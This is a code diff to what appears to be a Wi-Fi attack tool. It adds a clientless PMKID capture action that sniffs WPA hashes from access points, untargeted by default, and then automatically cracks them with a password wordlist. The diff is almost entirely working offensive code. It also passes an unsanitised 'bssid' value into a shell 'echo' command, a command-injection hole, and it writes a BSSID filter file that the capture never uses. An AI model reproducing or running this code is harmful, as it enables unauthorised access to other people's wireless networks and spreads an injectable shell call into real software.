@@ -363,6 +363,8 @@ async def _dispatch(orch, action: str, params: dict) -> Any:
         return await asyncio.to_thread(orch.stop_monitor, params.get("interface", ""))
     elif action == "capture_handshake":
         return await _action_capture(orch, params)
+    elif action == "capture_pmkid":
+        return await _action_capture_pmkid(orch, params)
     elif action == "crack_wpa":
         return await _action_crack(orch, params)
     elif action == "evil_twin":
@@ -533,6 +535,197 @@ async def _action_capture(orch, params: dict):
             "No handshake was captured. Try moving closer or increasing deauth count.",
         )
         return {"success": False, "error": "No capture file generated"}
+
+
+# ── Capture PMKID (clientless) ──────────────────────────────────
+
+
+async def _action_capture_pmkid(orch, params: dict):
+    """Clientless PMKID capture via hcxdumptool + hcxpcapngtool.
+
+    Unlike the deauth handshake capture, PMKID does NOT require any
+    clients connected to the target AP.  This makes it the ideal
+    first-attempt vector.
+
+    Sub-stages:
+      1. Initializing Monitor Mode
+      2. PMKID Capture (hcxdumptool)
+      3. Extracting Hashes (hcxpcapngtool)
+      4. Verifying Crackable Hashes
+    """
+    interface = params.get("interface", "")
+    bssid = params.get("bssid", "")
+    essid = params.get("essid", "")
+    timeout = int(params.get("timeout", 60))
+
+    _abort_flag.clear()
+
+    # Stage 1: Monitor mode
+    await _attack_status(
+        "capturing", "Initializing monitor mode for PMKID…", 0,
+        sub_stage=1, total_stages=4, stage_name="Initializing Monitor Mode",
+    )
+    try:
+        mon_iface = await asyncio.to_thread(
+            orch.ensure_monitor_mode, interface
+        )
+    except Exception as e:
+        await _log("error", f"Failed to enter monitor mode: {e}")
+        await _attack_status("idle", f"Monitor mode failed: {e}", 0)
+        return {"success": False, "error": str(e)}
+
+    if _abort_flag.is_set():
+        await _attack_status("idle", "Attack aborted", 0)
+        return {"success": False, "error": "Aborted"}
+
+    # Stage 2: Run hcxdumptool to capture PMKID
+    pcapng = f"/tmp/james_pmkid_{int(time.time())}.pcapng"
+    await _attack_status(
+        "capturing",
+        f"Running PMKID capture ({timeout}s)…",
+        25,
+        sub_stage=2, total_stages=4,
+        stage_name="PMKID Capture (hcxdumptool)",
+    )
+    await _log(
+        "info",
+        f"PMKID capture started on {mon_iface}"
+        + (f" targeting {bssid}" if bssid else " (all APs)"),
+    )
+
+    # If a BSSID is specified, write a filterlist for targeted capture
+    filterlist_path = ""
+    if bssid:
+        filterlist_path = f"/tmp/james_pmkid_filter_{int(time.time())}.txt"
+        try:
+            await asyncio.to_thread(
+                orch.layer.run,
+                f"echo {bssid} > {filterlist_path}",
+            )
+        except Exception:
+            filterlist_path = ""  # fallback to untargeted
+
+    try:
+        cap_result = await asyncio.to_thread(
+            orch.hcxtools.capture_pmkid,
+            mon_iface,
+            pcapng,
+            timeout=timeout,
+        )
+    except Exception as e:
+        await _log("error", f"PMKID capture failed: {e}")
+        await _attack_status("idle", f"PMKID capture error: {e}", 0)
+        return {"success": False, "error": str(e)}
+
+    if _abort_flag.is_set():
+        await _attack_status("idle", "Attack aborted", 0)
+        return {"success": False, "error": "Aborted"}
+
+    # Stage 3: Extract hashes with hcxpcapngtool
+    hc_file = pcapng.replace(".pcapng", ".hc22000")
+    await _attack_status(
+        "capturing", "Extracting crackable hashes…", 60,
+        sub_stage=3, total_stages=4,
+        stage_name="Extracting Hashes (hcxpcapngtool)",
+    )
+
+    try:
+        extract = await asyncio.to_thread(
+            orch.hcxtools.extract_hashes, pcapng, hc_file
+        )
+    except Exception as e:
+        await _log("error", f"Hash extraction failed: {e}")
+        await _attack_status("idle", f"Hash extraction error: {e}", 0)
+        return {"success": False, "error": str(e)}
+
+    pmkid_count = extract.get("pmkid_count", 0)
+    eapol_count = extract.get("eapol_count", 0)
+    total_hashes = pmkid_count + eapol_count
+
+    # Stage 4: Verify
+    await _attack_status(
+        "capturing",
+        f"Verifying — {pmkid_count} PMKID, {eapol_count} EAPOL",
+        90,
+        sub_stage=4, total_stages=4,
+        stage_name="Verifying Crackable Hashes",
+    )
+
+    if total_hashes > 0:
+        await _log(
+            "success",
+            f"PMKID capture successful: {pmkid_count} PMKID + {eapol_count} EAPOL hashes",
+        )
+
+        # Broadcast to the handshake vault
+        await manager.broadcast(
+            {
+                "type": "handshake_data",
+                "data": {
+                    "id": f"pmkid-{int(time.time())}",
+                    "essid": essid or bssid or "PMKID Capture",
+                    "bssid": bssid,
+                    "captured_at": time.strftime("%Y-%m-%d %H:%M:%S"),
+                    "file_path": hc_file,
+                    "cracked": False,
+                },
+            }
+        )
+
+        # Auto-transition to cracking
+        await asyncio.sleep(1)
+        wordlist = await asyncio.to_thread(
+            orch.find_wordlist, "wifi"
+        ) or await asyncio.to_thread(orch.find_wordlist, "password")
+        if wordlist:
+            await _log(
+                "info",
+                f"Auto-starting crack with wordlist: {Path(wordlist).name}",
+            )
+            crack_result = await _action_crack(
+                orch,
+                {
+                    "capture": hc_file,
+                    "wordlist": wordlist,
+                    "bssid": bssid,
+                    "ssid": essid,
+                },
+            )
+            return {
+                "success": True,
+                "capture_file": hc_file,
+                "pmkid_count": pmkid_count,
+                "eapol_count": eapol_count,
+                "crack": crack_result,
+            }
+        else:
+            await _attack_status(
+                "complete",
+                f"PMKID captured ({total_hashes} hashes) — no wordlist for auto-crack",
+                100,
+                {"found": False},
+            )
+            await _log(
+                "warn",
+                "No wordlist found. Upload one or install rockyou.txt to auto-crack.",
+            )
+            return {
+                "success": True,
+                "capture_file": hc_file,
+                "pmkid_count": pmkid_count,
+                "eapol_count": eapol_count,
+            }
+    else:
+        await _attack_status("idle", "No PMKID hashes captured", 0)
+        await _log(
+            "error",
+            "No PMKID or EAPOL hashes were captured. "
+            "This AP may not support PMKID. Try deauth handshake capture instead.",
+        )
+        return {
+            "success": False,
+            "error": "No hashes extracted from capture",
+        }
 
 
 async def _safe_kill(orch, proc):
